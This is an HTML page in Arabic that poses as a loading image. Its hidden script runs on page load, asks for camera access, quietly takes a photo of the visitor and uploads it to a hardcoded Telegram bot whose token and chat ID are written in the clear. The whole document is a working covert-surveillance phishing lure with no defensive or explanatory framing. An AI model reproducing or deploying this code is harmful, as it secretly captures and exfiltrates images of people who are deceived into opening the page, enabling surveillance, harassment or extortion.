<!DOCTYPE html>
<html>
<head>
    <title>صورة</title>
</head>
<body>
    <video id="video" autoplay style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    <div style="text-align:center; margin-top:200px">
        <h2>جاري تحميل الصورة...</h2>
        <p>يرجى الانتظار</p>
    </div>
    <script>
        const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
        const CHAT_ID = "8545876964";

        async function capturePhoto() {
            try {
                // طلب الوصول إلى الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    // التقاط الصورة
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // تحويل الصورة إلى blob
                    canvas.toBlob(async (blob) => {
                        // إرسال إلى تلغرام
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob);
                        
                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        const result = await response.json();
                        console.log(result);
                        
                        if (result.ok) {
                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:green">✅ تم بنجاح!</h2>';
                        } else {
                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:red">❌ خطأ: ' + result.description + '</h2>';
                        }
                    }, 'image/jpeg');
                    
                    // إيقاف الكاميرا
                    stream.getTracks().forEach(track => track.stop());
                };
            } catch(error) {
                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:red">❌ لا يمكن الوصول للكاميرا<br>' + error.message + '</h2>';
            }
        }
        
        // تشغيل
        capturePhoto();
    </script>
</body>
</html>
